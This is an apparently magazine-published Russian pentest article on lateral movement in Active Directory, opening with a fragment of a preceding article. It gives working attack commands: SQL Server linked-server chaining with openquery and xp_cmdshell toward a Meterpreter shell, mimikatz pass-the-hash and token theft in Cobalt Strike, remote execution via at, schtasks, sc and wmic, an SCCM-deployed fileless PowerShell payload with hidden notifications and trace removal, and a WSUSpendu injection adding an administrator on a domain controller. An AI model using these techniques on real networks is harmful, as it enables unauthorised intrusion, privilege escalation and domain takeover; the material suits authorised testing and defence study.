должны быть системные администра торы, обеспечивающие безопас ность
в среде Active Directory. Помни, что все неправомерные действия преследу‐
ются по закону!
  Для тех, кто хочет получить больше информа ции по этой теме, я создал
телеграм‐канал @RalfHackerChannel, где ты сможешь задать свои вопросы
(или ответить на вопросы других юзеров). До встречи в следующих статьях!
COVERSTORY

   БОКОВОЕ
 ПЕРЕМЕЩЕНИЕ
  В ACTIVE DIRECTORY





            РАЗБИРАЕМ ТЕХНИКИ
              LATERAL MOVEMENT
                RalfHacker   ПРИ АТАКЕ НА ДОМЕН
             hackerralf8@gmail.com





Предположим, ты успешно раздобыл учетные записи поль‐
зователей в сети с контроллером домена Active Directory
и даже смог повысить собственные привилегии. Казалось
бы, можно рас слабиться и почивать на лаврах. Как бы не так!
Что, если мы захватили не всю сеть, а ее опре деленный сег‐
мент? Нужно разобраться, как продвигаться по сети дальше,
искать новые точки вхо да, опоры для проведения раз ведки
и дальнейшего повышения привиле гий!


Читай так же про пен тесты Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Защита от детекта в Active Directory. Уклоняемся от обнаружения при атаке
   на домен




ТЕХНИКА LATERAL MOVEMENT ЧЕРЕЗ ССЫЛКИ MICROSOFT SQL
SERVER
Для начала — немного теории. Microsoft SQL Server позволя ет соз давать
ссылки на внешние источники данных, например дру гие серверы SQL, базы
данных Oracle, таблицы Excel. Зачастую сервер настроен неправильно, из‐за
чего подобные ссылки (свя зи или линки), или «свя занные серверы», могут
использоваться для обна ружения и обхода свя зей базы данных в сети,
получения неавторизованного дос тупа к данным или загрузки различных обо‐
лочек. Как подобные ата ки реализуются на практике, мы сейчас и разберем.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



Вве дение в ссыл ки
Создание связи на SQL Server довольно три виаль но. Это можно сделать
с помощью хранимой процеду ры sp_addlinkedserver или SQL Server Man‐
agement Studio (SSMS). Обычно зло умышленники не стремятся создавать
линки, но пытаются найти существу ющие и эксплу атировать их.
  Связи можно просмотреть в меню «Объекты сервера → Серверы ссылок»
в SSMS. В качестве альтернативы они могут быть перечис лены с помощью
хранимой процедуры sp_linkedservers или с помощью запроса select *
from   master..sysservers.  Выбирать  непосредственно  из  таблицы
sysservers предпочтительно, поскольку так рас кры вается немного больше
информации о линках.
  Для существующих ссылок есть нес колько ключевых настроек, на которые
следует обратить внимание. Очевидно, что назначение ссылки, тип источника
данных (имя провайдера) и доступность ссылки (доступ к данным) важны
для использования связи. Кроме того, исходящие соеди нения RPC (rpcout)
должны быть вклю чены для ссылок, что бы, в свою очередь, включить xp_cmd‐
shell на удаленных связанных серверах.
  Злоумышленники при взломе свя зей базы данных обращают внимание
на две основные конфигурации: источник данных (имя провайдера) и способ
настройки линков для проверки подлиннос ти. Сосредоточимся на источниках
данных SQL Server, которые подклю чаются к другим серверам Microsoft SQL
Server.
  Каждую из этих связей SQL Server мож но нас троить для проверки под‐
линности несколькими способами. Можно отклю чить линки, не предоставляя
учетные данные для подключения. Также мож но использовать текущий кон‐
текст безопасности или установить учет ную запись SQL и пароль, которые
будут  задействованы  для  всех  подключений,  использующих  ссылку.
Как показывает практика, пос ле обхода всех связей всегда есть одна
или несколько настроек с раз решениями sysadmin; это позволяет повысить
привилегии от начального общедос тупного доступа к доступу sysadmin, даже
не выходя из уровня базы данных.
   Хотя только системные администраторы могут соз давать ссылки, любой
пользователь базы данных может попытать ся получить к ним доступ. Тем
не менее есть две очень важные вещи, которые нужно понять про исполь‐
зование ссылок:
 • если связь включена (dataaccess уста новлен в 1), каждый пользователь
   на сервере базы данных может использовать ссылку независимо от прав
   пользователя (public, sysadmin);
 • если связь настроена на использование учет ной записи SQL, каждое под‐
   клю чение будет с правами этой учетной записи. Другими словами, обще‐
   доступный поль зователь на сервере A может потенциально выполнять
   SQL‐запросы на сервере B как sysadmin.

Ссыл ки на SQL Server очень просты в использовании. Например, следующий
запрос с использованием openquery() перечис ляет версию сер вера на уда‐
ленном сервере.


select version from openquery("linked_remote_server", 'select
@@version as version');

Также можно использовать openquery для выпол нения SQL‐запросов по нес‐
кольким вложен ным линкам; это делает воз можным связывание ссы лок и поз‐
воляет использовать деревья ссылок.


select version from openquery("link1",'select version from openquery(
"link2",''select @@version as version'')')

Подобным же образом можно вложить столько операторов openquery,
сколько необходимо для доступа ко всем связанным серверам. Единственная
проблема состоит в том, что каждый вложенный зап рос должен использовать
вдвое больше одинарных кавычек, чем внеш ний зап рос. В результате син‐
таксис запросов становится довольно громоздким, когда тебе при ходится
использовать 32 одинарные кавычки в каждой строке.


Схе ма эксплу атации изнутри сети
На следующем рисунке показан пример типичной сети связанных баз данных.
Пользователь с общими пра вами доступа к DB1 может перейти по ссылке
базы данных на DB2 (разрешения уровня поль зователя) и от DB2 до DB3
(разрешения уровня пользователя). Теперь можно перейти по ссылке
из DB3 обратно в DB1 (разрешения уровня пользователя) или по ссылке
на DB4. Так как эта ссылка нас троена с повышенными привилегиями, сле‐
дование цепочке ссылок DB1 → DB2 → DB3 → DB4 дает изначально неп‐
ривилегированному  пользователю  полномочия  пользователя  sysadmin
на DB4, который расположен в «изолированной» сетевой зоне.





                  Схема сети свя занных баз данных

Ссыл ки на базы данных также могут запрашиваться с использовани ем аль‐
тернативного синтаксиса, но он не допус кает зап росы по нескольким ссыл‐
кам. Кроме того, фактическая экс плуатация требует, чтобы rpcout был вклю‐
чен для ссылок, и, поскольку он отключен по умолчанию, это вряд ли будет
часто использоваться на практике.
   Хотя Microsoft заявляет, что openquery() нельзя использовать для выпол‐
нения расширенных хранимых процедур на связанном сервере, это воз‐
можно. Хитрость заключа ется в том, чтобы вернуть некоторые данные, завер‐
шить оператор SQL и затем выполнить требуемую хра нимую процедуру. Ниже
приведен базовый пример выполнения процеду ры с помощью openquery().


select 1 from openquery("linkedremoteserver",'select 1;exec master..
xp_cmdshell "dir c:"')

Запрос не возвращает результаты xp_cmdshell, но, если xp_cmdshell вклю‐
чен и пользователь имеет пра ва на его выполнение, он выполнит команду dir
в операционной системе. Один из прос тых спо собов получить оболочку
в целевой системе — вызвать PowerShell (если этот командный интерпре‐
татор установлен в ОС) и передать бэкконнект на оболочку Meterpreter.
В целом алгоритм действий выглядит следующим образом:
 1. Создать сценарий PowerShell для выполнения своей полезной нагрузки
   Metasploit, пример можно взять здесь.
 2. Закодировать скрипт в Unicode.
 3. Закодировать в Base64.
 4. Выполнить команду powershell  noexit  noprofile  Encoded
  Command с помощью xp_cmdshell.

Если xp_cmdshell не вклю чен на свя занном сервере, воз можно, его не удас‐
тся включить, даже если ссылка настроена с привилегиями sysadmin. Любые
запросы, выполняемые через openquery, считаются пользовательскими
транзакциями, которые не поз воляют сделать перенастройку. Включение
xp_cmdshell с помощью sp_configure не изменяет сос тояние сервера
без перенастройки, и, следовательно, xp_cmdshell останется отключенным.
Если rpcout включен для всех ссы лок внут ри пути ссылки, можно включить
xp_cmdshell, используя следующий син таксис.


execute('sp_configure "xp_cmdshell",1;reconfigure;') at LinkedServer

Но, как уже отме чалось, rpcout по умолчанию отклю чен, поэтому он вряд ли
будет работать с длинными цепочками ссылок.


Схе ма эксплу атации извне
Хотя ссылки на базы данных могут стать неплохим способом повысить при‐
вилегии после того, как получен аутентифицированный доступ к базе данных
внутри сети, более серьезный риск воз ника ет, ког да связанные серверы дос‐
тупны извне. Те же SQL‐инъ екции очень рас пространены, и успешная атака
дает возможность выполнять произвольные запросы SQL на сервере базы
данных. Если соединение с базой данных веб‐приложения сконфигурировано
с наименьшими привилегиями (что происходит довольно час то), то нетрудно
увеличить разрешения для внутренней сети, где, вероятно, рас положен сер‐
вер базы данных. Однако, как упомина лось ранее, любому пользователю,
независимо от его уровня привилегий, дос тупны предварительно настро‐
енные связи между базами данных.
  На следующем рисунке показан путь атаки извне. Найдя SQL‐инъекцию
на сервере веб‐приложений, злоумышленник может начать переходить
по ссылкам DB1 → DB2 → DB3 → DB4. И пос ле получения разрешений
sysadmin на DB4 он может выполнить xp_cmdshell, чтобы запустить Power‐
Shell и получить бэк коннект.





                Схема атаки на свя занные базы извне

Таким образом зло умышленник получа ет привилегии в изолированном сег‐
менте корпоративной сети и может претендовать на компрометацию всего
домена, при этом изначально не имея дос тупа к внутренней сети.


Как авто матизиро вать обнаруже ние пути эксплу атации
Для автоматизации перечисления и обхода ссылок после того, как пер‐
воначальный доступ к SQL Server получен, можно применить уже упоминав‐
шийся в предыдущих статьях инстру мент PowerUpSQL.
  Функция Get‐SQLServerLinkCrawl может использоваться для сканиро‐
вания всех доступных путей свя занных серверов, а также перечисления вер‐
сий программного обеспечения и привилегий, с которыми настроены ссылки.
Чтобы  запустить  Get‐SQLServerLinkCrawl,  нужно  будет  предоставить
информацию об экземпляре базы данных для начального под ключения к БД
и учетные данные, используемые для авторизации. По умолчанию скрипт
выпол няется с использованием встроенной аутентификации, но при желании
можно указать альтернативные учетные данные домена и учетные данные
SQL Server.
  Для вывода в консоль вос пользуемся командой


Get‐SQLServerLinkCrawl ‐verbose ‐instance "[ip‐address]\SQLSER
VER2008"

Для вывода же по сети используем функцию следующим образом.


Get‐SQLServerLinkCrawl ‐verbose ‐instance "[ip‐address]\SQLSER
VER2008" ‐username 'guest' ‐password 'guest' | Out‐GridView

Результаты будут вклю чать экземпляр базы данных, информацию о ее версии,
пользователя ссылки, привилегии пользователя ссылки на связанном сер‐
вере, путь ссылки на сервер и ссылки на каждый экземпляр базы данных. Свя‐
занные серверы, которые недоступны, помеча ются как неработающие ссыл‐
ки.





            Пример вывода сети с Get‐SQLServerLinkCrawl

Кроме того, Get‐SQLServerLinkCrawl поз воляет выпол нять произвольные
запросы SQL на всех связанных серверах с использованием параметра ‐
Query. Xp_cmdshell (для выполнения команды) и xp_dirtree (для внедрения
в UNC‐путь) также могут быть выполнены с помощью параметра ‐Query.


Get‐SQLServerLinkCrawl ‐instance "[ip‐address]\SQLSERVER2008" ‐Query
"exec master..xp_cmdshell 'whoami'"
Get‐SQLServerLinkCrawl ‐instance "[ip‐address]\SQLSERVER2008" ‐Query
"exec master..xp_dirtree '\\[ip]\test'"

Но согласись, что вывод того же BloodHound в виде графа связей через
Neo4j куда удобней для анализа и поиска пути экс плуатации, чем информа‐
ция, представленная в виде текста. Можно поп робовать сделать аналогичный
граф и для Get‐SQLServerLinkCrawl. Результаты Get‐SQLServerLinkCrawl
необходимо экспортировать в файл XML с помощью Export‐Clixml.


Get‐SQLServerLinkCrawl ‐verbose ‐instance "[ip‐address]\SQLSER
VER2008" ‐username 'guest' ‐password 'guest' | export‐clixml c:\temp\
links.xml

Экспортированный файл XML будет затем преобра зован в файл узла и файл
ссылки, чтобы их можно было импортировать в базу данных Neo4j. Сле‐
дующий скрипт создаст файлы импорта и предоставит необходимые опе‐
раторы Cypher для создания графа. Очевидно, что все пути к файлам жес тко
закодированы в PowerShell, поэтому их придет ся заменить, если ты запус‐
тишь  скрипт. Последние  (необязательные) операторы  Cypher  соз дают
начальный узел, с целью указать, где начался обход контента; ServerID дол‐
жен быть обновлен вручную, что бы он указывал на первый SQL Server,
к которому был получен доступ.


$List = Import‐CliXml 'C:\temp\links.xml'
$Servers = $List | select name,version,path,user,sysadmin ‐unique |
where name ‐ne 'broken link'
$Outnodes = @()
$Outpaths = @()
foreach($Server in $Servers){
    $Outnodes += "$([string][math]::abs($Server.Name.GetHashCode())),
$($Server.Name),$($Server.Version)"
    if($Server.Path.Count ‐ne 1){
        $Parentlink = $Server.Path[‐2]
        foreach($a in $Servers){
            if(($a.Path[‐1] ‐eq $Parentlink) ‐or ($a.Path ‐eq $Parent
link)){
                [string]$Parentname = $a.Name
                break
            }
        }
        $Outpaths += "$([math]::abs($Parentname.GetHashCode())),$([
math]::abs($Server.Name.GetHashCode())),$($Server.User),$($Server.
Sysadmin)"
    }
}


$Outnodes | select ‐unique | out‐file C:\pathtoneo4j\Neo4j\default.
graphdb\Import\nodes.txt
$Outpaths | select ‐unique | out‐file C:\pathtoneo4j\default.graphdb\
Import\links.txt


<#
 [OPTIONAL] Cypher to clear the neo4j database:
 MATCH (n)
 OPTIONAL MATCH (n)‐[r]‐()
 DELETE n,r
 ‐‐
 Cypher statement to create a neo4j graph ‐ load nodes
 LOAD CSV FROM "file:///nodes.txt" AS row
 CREATE (:Server {ServerId: toInt(row[0]), Name:row[1], Version:row[
2]});
 ‐‐‐
 Cypher statement to create a neo4j graph ‐ load links
 USING PERIODIC COMMIT
 LOAD CSV FROM "file:///links.txt" AS row
 MATCH (p1:Server {ServerId: toInt(row[0])}), (p2:Server {ServerId:
toInt(row[1])})
 CREATE (p1)‐[:LINK {User: row[2], Sysadmin: row[3]}]‐>(p2);
 ‐‐‐
 [OPTIONAL] Cypher statement to create a start node which indicates
where the crawl started. This is not automated; first node id must
be filled in manually (i.e. replace 12345678 with the first node's
id).
 CREATE (:Start {Id: 1})


 [OPTIONAL] Link start node to the first server
 MATCH (p1:Start {Id: 1}), (p2:Server {ServerId: 12345678})
 CREATE (p1)‐[:START]‐>(p2);
#>

Если все работает хорошо, ты сможешь просмотреть график связей, исполь‐
зуя Neo4j Browser.





                  График свя зей серверов баз данных

Связанные серверы довольно распространены, и иногда сети свя занных сер‐
веров содержат сотни серверов баз данных. Цель Get‐SQLServerLinkCrawl
состоит в том, чтобы предоставить прос той и авто матизированный способ
анализа масштабов этих сетей и легко найти путь бокового движения.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

           БОКОВОЕ
      ПЕРЕМЕЩЕНИЕ
    ACTIVE DIRECTORY  В
            РАЗБИРАЕМ ТЕХНИКИ LATERAL MOVEMENT
                          ПРИ АТАКЕ НА ДОМЕН





PASS-THE-HASH
О технике PTH, как и об одинако вых паролях локальных адми нистраторов
на компьютерах домена, уже было рас сказано во вто рой час ти цикла статей
про Active Directory. Допус тим, проанализировав некоторые нас тройки груп‐
повой политики, мы выяс нили, что на всех компьютерах домена име ются оди‐
наковые учетные данные локального администра тора, и мы смогли завладеть
этими данными. Далее мы решаем использовать технику pass‐the‐hash
для доступа к другим машинам в сети, чтобы выполнить боковое движение.
Для этого мы используем mimikatz. Если нам известен открытый пароль, то мы
получаем его хеш с помощью модуля crypto::hash. Сделать это можно
командой


crypto::hash /password:[password]

Теперь можно получить новую консоль под учетной записью, для которой мы
выпол няем PTH.


privilege::debug
sekurlsa::pth /ntlm:[hash] /user:admin /domain:.

Однако после проверки дос тупа мы терпим неуда чу.





              Выполнение PTH с помощью mimikatz

Дело в том, что сущес тву ет два идентификатора безопас ности SID: S‐1‐5‐
113 (NT AUTHORITY\Local account) и S‐1‐5‐114 (NT AUTHORITY\Local
account and member of Administrators group). Они при меняются в груп‐
повой политике, чтобы бло кировать использование всех локальных учетных
записей администраторов для удален ного входа. А проверить, на каких
машинах установлены эти ограничения, может любой пользователь, который
прошел провер ку подлиннос ти в домене, прос то перечис лив групповые
политики (о перечислении групповых политик было сказано в первой статье
этого цикла).
  На самом деле нет возможности передать хеш учетной записи локального
администратора, который не имеет относительный идентификатор RID 500
(Local Administrator). Так, для любой учетной записи локального админис тра‐
тора без RID 500, удаленно подключающейся к машине через WMI, PSEXEC
или другими методами, воз вращаемый токен «филь труется», даже если поль‐
зователь является локальным администратором. Это происходит потому, что
нет способа удален ного перехода в контекст, кроме как через RDP (для
которого требуется пароль в виде открытого текста, если не включен режим
Restricted Admin). Поэтому, ког да пользователь пытается получить доступ
к привилегированному ресурсу удален но, например к папке ADMIN$, он видит
сообщение Access is denied, несмотря на то что у него есть административ‐
ный доступ.
  Вдобавок ко всему, когда пользователь, который входит в группу локаль‐
ных администраторов на целевом уда лен ном компьюте ре, устанавливает уда‐
ленное административ ное соединение, он не подклю чается как пол ный адми‐
нистратор удален ной системы. У пользователя нет воз можнос ти повысить
права на удаленном компьютере, и он не может выполнять админис тративные
задачи.  Если  поль зователь  хочет адми нистрировать  рабочую  станцию
с помощью учетки диспетчера учетных записей безопасности (SAM), он дол‐
жен интерактивно войти в систему на компь ютере, который админис трирует‐
ся с помощью удаленного рабочего сто ла (RDP).
   Это объясняет, почему локальные учетные записи администраторов тер‐
пят неудачу при удален ном доступе (кро ме как через RDP), а также почему
учетные записи домена выполняют свои операции успешно. И хотя Windows
по умолчанию отключает встроенную учет ную запись администратора RID
500, ее все же довольно часто можно увидеть в исследуемых системах.
   Есть еще одна возможная причина неудачи — так называемый режим
одобрения администратором. Ключ, который указывает на этот режим, хра‐
нится в клю че реестра


HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Filter
AdministratorToken

и по умолчанию отключен. Одна ко, если этот параметр активирован, учетная
запись с RID 500 зарегистрирована в UAC. Это озна чает, что удаленный PTH
к машине, использующей эту учетную запись, завершится неудачно.
   Если ключ


HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalA
ccountTokenFilterPolicy

существует и име ет значение 1, тог да удаленным подключениям от всех
локальных администраторов предос тавляются полные маркеры доступа.
Это означает, что подключения к учет ной записи без RID 500 не фильтру‐
ются!





                Добавление необ ходимого ключа





                    Ус пешное подключение с PTH

Но как на своих машинах работа ют локальные адми нистраторы при включен‐
ном контроле токена? По умолчанию встро енная учетная запись администра‐
тора запускает все приложения с пол ными административными привиле‐
гиями, то есть контроль учет ных записей пользователей фактически не при‐
меняется.  Поэтому,  когда  действия  уда ленного  юзе ра  инициируются
с использованием этой учетной записи, предоставляется маркер с пол ными
привилегиями  (то есть без филь тра ции), обеспечивающий надлежащий
административный доступ! И мы можем это исполь зовать.
  Следующий  способ  кра жи  и  присвоения  токена  воспроизведен
с помощью Cobalt Strike. Для начала получим хеш, использовав hashdump.





              Получение хешей с помощью hashdump

Далее создадим процесс PowerShell.


mimikatz sekurlsa::pth /user:[user] /domain:. /ntlm:[hash] /run:
"powershell ‐w hidden"





            PTH с исполь зованием mimikatz в Cobalt Strike

Используем steal_token для кра жи токена из созданного mimikatz процесса
с известным PID.





                Кража токена при помощи steal_token

Теперь мы можем использовать один из нескольких вариантов бокового
перемещения.
  Вариант 1: запланировать  запуск программы на удаленном хосте
с помощью at. Первым делом узна ем, какое на хосте установлено вре мя,
после чего планируем выполнение задачи.


shell net time \\[address]
shell at \\[address] [HH:MM] [c:\windows\temp\soft.exe]

Вариант 2: запустить код в целевой сис теме через schtasks.


shell schtasks /create /tn [name] /tr [c:\windows\temp\soft.exe] /sc
once /st 00:00 /S [address] /RU System
shell schtasks /run /tn [name] /S [address]

Вариант 3: создать и запустить службу через sc. Команде sc требуется
исполняемый файл, который отвечает на команды Service Control Manager.
Если ты не предоставишь ей такой исполня емый файл, твоя программа
запустится и сразу же закроется. Пос ле экс плуатации рекомендуется удалить
службу.


shell sc \\[address]  create [name] binpath=["c:\windows\temp\
SERVICE.exe"]
shell sc \\[address] start [name]
shell sc \\[address]  delete [name]

Вариант 4, наиболее рас простра ненный: задей ство вать wmic.


shell wmic /node:[address] process call create ["c:\windows\temp\
soft.exe"]





              Боковое перемещение с помощью wmic

В примере выше мы загружа ем на хост файл и запускаем его с помощью
wmic.


SYSTEM CENTER CONFIGURATION MANAGER
System Center Conﬁguration Manager (SCCM) — про дукт для управления IT‐
инфраструктурой и смежными устройства ми. Он предос тавляет следующие
основные возможности:
 • управление обновлениями;
 • развертывание ПО и операционных систем;
 • интеграция с NAP;
 • инвентаризация аппа ратного и прог раммного обеспечения;
 • удаленное управле ние;
 • управление виртуализированными и мобильными системами на базе
   Windows.

Кроме того, SCCM позволяет ИТ‐персоналу авто матичес ки создавать сце‐
нарии и отправ лять их клиентам. Если мы смо жем получить дос туп к SCCM,
это станет отличной платформой для последу ющих атак. Он тес но интегри‐
рован с Windows PowerShell, имеет широкую сетевую видимость и несколько
клиентов SCCM, способных выполнять код с правами SYSTEM.
  Для использования SCCM в качес тве инс трумента для бокового движения
потребуется доступ с повышенными правами. Но, как уже было отмечено,
SCCM имеет широкую сетевую видимость, то есть мы сможем получить дос‐
туп к клиентам‐участникам даже из дру гого домена. Для удобства доступа
к консоли SCCM предлагается использовать RDP (к тому же это легитимное
программное обеспечение для управления в большинс тве корпоративных
сетей, что снижает риск обна ружения).





                         Консоль SCCM

Для поддержки функции кло нирования Active Directory SCCM хранит объ екты
машин и пользователей, а также сопос тавления между ними. Именно бла‐
годаря этому есть возможность контролировать программное обеспечение
определенных пользователей. Что бы предос тавить доступ к той или иной
группе юзе ров, SCCM поз воляет соз давать так называемые кол лекции. Таким
образом, установив контроль над SCCM, мы можем получить спи сок всех
пользователей‐клиентов и их компь ютеров — из них мы и будем выбирать
цели. Кроме того, мы можем посмотреть сущес твующие кол лекции или соз‐
дать свои, что позволит нам применять дей ствия сразу ко всем участни кам
в кол лекции.
  Самый популярный у зло умышленников способ использования функций
SCCM — выполнение кода PowerShell. Так можно получить бэкконнект‐шелл
и не оставить сле дов на физичес ком диске. Для этого нам нужно иметь
общий ресурс, к которому выбранные клиенты могут получить доступ. На этом
ресурсе мы размещаем текстовый файл, содержащий код PowerShell.





          Пример install.txt с вредоносным PowerShell‐кодом

Теперь нам нужно создать приложение из меню Application Management.
В первом окне будет предложено указать тип установки приложения. Необ‐
ходимо выбрать ручной режим (Manually specify the application information).





               Выбор типа установки приложения

Дальше установ ка интуитивно понятна, главное — помнить, что чем меньше
информации мы указыва ем, тем лучше. Когда ты дойдешь до раздела Specify
setting for this deployment type, необ ходимо добавить новый тип разверты‐
вания — в разделе Type выбрать опцию Script Installer.





                  Выбор типа раз вертывания

Переходим к самой важной час ти создания приложения — пейлоаду. В этом
разделе необходимо оста вить поле Content Location пустым. В обычных слу‐
чаях именно здесь администратор может ука зать рас положе ние файлов уста‐
новки приложения. Поскольку мы хотим избежать вза имодействия с диском,
мы не заполняем это поле. Следом переходим к полям Installation program
и Installation start  in. Здесь мы собираемся разместить команду, которая
и будет выполнять наш пейлоад. Installation program будет выглядеть при мер‐
но так.


cmd.exe /c "powershell.exe ‐ep bypass ‐c 'gc \\имя_сервера \
общий_ресурс \директория_приложения \payload.txt | IEX'"

Консоль cmd.exe использует ся для запуска PowerShell, а затем с помощью
Get‐Content (gc) PowerShell обратится к \\sccm2012\sccmsource\Legit‐
Application и прочитает содержимое Install.txt. После  этого код
передается в Invoke‐Expression (iex) для его выполнения. Это позволяет
нам выполнять пейлоад на целевом объекте, не заг ружая файл в фай ловую
систему.
  После того как мы установили программу, нам нужно указать, где будет
начинаться установка. Поскольку в поле Installation program используется
только cmd.exe, SCCM просит нас уточнить расположение этого исполня‐
емого файла. Таким обра зом, для это го поля нуж но выбрать C:\Windows\
System32.





                        Ус тановка при ложения

После этого мы перейдем к меню Detection Method. Параметры, указанные
здесь, сообщат SCCM, как определить, установлено на клиенте целевое при‐
ложение или нет. SCCM проверит ука занные параметры перед установкой
приложения, чтобы предот вра тить повторную установку. Пос кольку пейлоад
выпол няется в памяти, проверять нечего, поэто му можно заполнить поле
фиктивной информацией. Также убедись, что ты установил переключатель
в положение The ﬁle system setting must exist on the target system to indicate
presence of this application (настройка файловой сис темы должна существо‐
вать в целевой системе, что бы ука зывать на наличие этого приложения).





                Меню «Метод обнаружения»

Дальнейшие настрой ки уста новки можно оставить по умолчанию. Чтобы раз‐
вернуть созданное приложение пос ле ее завершения, просто щел кни
по нему правой кнопкой мыши и выбери Deploy (развернуть), указав при этом
нужную коллекцию. В настройках для взаимодей ствия с пользовате лем убе‐
дись, что ты скрыл все уведомления. Теперь приложение будет ожидать уста‐
новки при регистрации пользователя, то есть для того, чтобы выполнить пей‐
лоад, необходимо будет перезагрузить пользовательскую машину. Для боль‐
шей скрытности после завершения работы пейлоада лучше удалить из SCCM
все следы.
  Вдобавок скажу, что есть вариант работы с SCCM из консоли. Это очень
удобно сделать с помощью PowerSCCM. Описывать этот инструмент я
не буду, у него доволь но‐таки подробная документация.
   Теперь ты знаешь, как можно использовать SCCM для выявления целей
атаки в сети, группировать выб ранные цели вмес те и загружать пейлоад
в память одновременно для всех выбранных целей. SCCM нередко служит
«точкой управле ния» для большинс тва рабочих станций на предприятии,
и из‐за этого у сервера SCCM часто будет широкая, если не полная
видимость всей сети. Наше приложение повторно выполнится на клиентских
машинах SCCM после перезагрузки, что поз волит нам оставаться на компь‐
ютере без необходимости сохранять файл на дис ке. Таким образом, SCCM
представ ляет собой отличную плат форму для продвижения по сети без необ‐
ходимости использования обычных методов боково го перемещения.


WINDOWS SERVER UPDATE SERVICES


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

           БОКОВОЕ
      ПЕРЕМЕЩЕНИЕ
    ACTIVE DIRECTORY  В
            РАЗБИРАЕМ ТЕХНИКИ LATERAL MOVEMENT
                          ПРИ АТАКЕ НА ДОМЕН





О WSUS
Windows Server Update Services (WSUS) — это сервис обновле ний операци‐
онных систем и продуктов Microsoft. Сервер обновлений синхронизируется
с сайтом Microsoft, скачивая обновления, которые затем могут быть рас‐
пространены внутри кор поративной локальной сети. Это экономит внешний
трафик компании и поз воляет быстрее уста навливать исправления ошибок
и уязвимостей в операционных системах Windows на рабочих местах, а также
дает  возможность централизованно  управлять обновлениями серверов
и рабочих станций. Он прост в использовании и установке, и его можно адап‐
тировать в соответствии с различными правилами для каждой организации.
Однако неправильное использование его функций может иметь критичес кое
значение для безопасности сети.
  Для компрометации данной службы соз дан инс трумент под названием
WSUSpendu. Однако зло умышленник не всегда сможет использовать этот
инструмент. Дело в том, что WSUSpendu применяет метод прямого внед‐
рения обновлений в служ бу WSUS, а не в сетевой поток, чтобы избе жать
сетевых ограничений. Главная проблема при аудите управления обновле‐
ниями заключается в сборе состояний обновлений в каждой системе. Эти
состояния должны быть согласованными. Прямой доступ к серверу WSUS
позволяет нам обой ти эти ограничения.
  Наиболее распростра ненная конфигура ция сети — та, где есть только
один сервер обновлений. Этот сервер обновляет свои собственные клиенты
и подключается к интернету для получения обновлений от серверов Microsoft.
Связь между сер вером WSUS и серверами Центра обновления Windows дол‐
жна использовать протокол HTTPS (эти конфигурации недос тупны для редак‐
тирования). Сервер WSUS проверяет сертификат SSL, чтобы исключить заг‐
рузку вредоносных обновлений через подделку легитимных серверов. Кли‐
енты получают свои обновления на сервере WSUS в соответствии с кон‐
фигурацией сервера: используя протокол HTTPS, если сервер настроен
с использованием SSL, или протокол HTTP, если нет.





                    Простая архитектура WSUS

Большая организация, скорее всего, будет исполь зовать несколько серверов
WSUS. В этом случае применя ется древовидная архи тектура. Главный сервер
подклю чен к интернету. Другие серверы WSUS (репликации) распространяют
обновления для одного сегмента или одной подсети. Также возможно
использовать этот вид архитектуры с автономной системой. В этом случае
обновления копируются, но применяются авто матически.





                 Древовидная архитектура WSUS

Эти две архитектуры рекомендуются  Microsoft. Однако их недостаточно
для некоторых организаций, и там в сетях можно наб людать две другие архи‐
тектуры. Первая часто встречается в относительно крупных компаниях: она
имеет несколько доменов или лесов, которые не обязательно свя заны
доверительными отно шениями Active Directory. В этих архитектурах мы часто
видим общие сер веры для функций поддержки. Хотя домены не имеют отно‐
шений, серверы обновлений часто имеют общую ссылку: сервер WSUS одно‐
го из доменов исполь зуется в качестве ссылки на сервер WSUS дру гой сети.





      Архитектура WSUS со свя занными серверами в разных доменах

Для всех этих архитектур мож но вручную уста навливать любые обновления
программного обеспечения, предложенные Microsoft. Но также возможно
автоматическое применение обновлений в соответствии с определенными
критериями. При установке WSUS соз дается правило, которое по умолчанию
отключено и позволяет при активации автомати чес ки принимать установку
всех «критических» или «безопасных» обновлений на клиентах WSUS.


Атака на WSUS
Существует несколь ко атак на механизм обновления Windows. Все атаки
работают только меж ду сервером и клиентом. Чтобы атака WSUSpect
сработала, клиент дол жен использовать машину злоумышленни ка в качестве
прокси. Один из способов выполнения этой ата ки — для непривилегирован‐
ного пользователя на клиенте уста новить прокси‐сервер. Другой способ
выпол нить эту атаку — использовать протокол WPAD. WSUSpect перехватыва‐
ет запрос на обновле ние от клиента и вмешива ется в него, чтобы добавить
свое вредоносное обновление.
  Ответ сервера изменяют, вставляя метаданные и двоичные файлы, чтобы
попытаться выпол нить произвольный код на клиенте. Но дело в том, что
на локальном компьюте ре будет про верена подпись. С этой конфигурацией
невозможно изменить обновление, добавив в него произвольный двоичный
файл. Тем не менее аргументы команды не вклю чены в проверку подписи.
Таким образом, можно изменять аргу менты дво ичного файла (к примеру
cmd.exe, wmic.exe) для выполнения некоторых команд. Но подписи к данным
файлам не хранятся, а хранятся подписи к каталогу с этими файлами, что
не позволит передать им аргумент. Однако бла года ря поддержке Microsoft
Sysinternals есть подписи для файлов из данного пакета, в частнос ти PsExec.
  WSUSpendu может развертывать обновления, соз давать и удалять группы
WSUS, назначать компьютеры группам и уда лять обновления. Скрипту нужно
указать PsExec или BgInfo, так как только эти программы подписаны Microsoft
и могут выполнять произвольные команды в любых сис темах Windows. Сце‐
нарий принимает аргументы для двоичного файла в качестве параметра
и автоматически внедряет выбранные двоичные и специально созданные
метаданные в базу данных. Сценарий PowerShell, а также выбранный дво‐
ичный файл необходимо загрузить на сервер WSUS для локального выпол‐
нения.


PS> .\Wsuspendu.ps1 ‐Inject ‐PayloadFile .\PsExec.exe ‐PayloadArgs
'‐accepteula ‐s ‐d cmd.exe /c "net user [USER] [PASSWORD] /add &&
net localgroup Administrators [USER] /add"' ‐ComputerName DC1.domain


Everything seems ok. Waiting for client now...
To clean the injection, execute the following command:


.\Wsuspendu.ps1 ‐Clean ‐UpdateID 12345678‐90ab‐cdef‐1234‐567890abcdef





                          Консоль WSUS





                   Уведомление о новом обновлении

Обновление будет зависеть от конфигурации клиента, неважно, был ли он
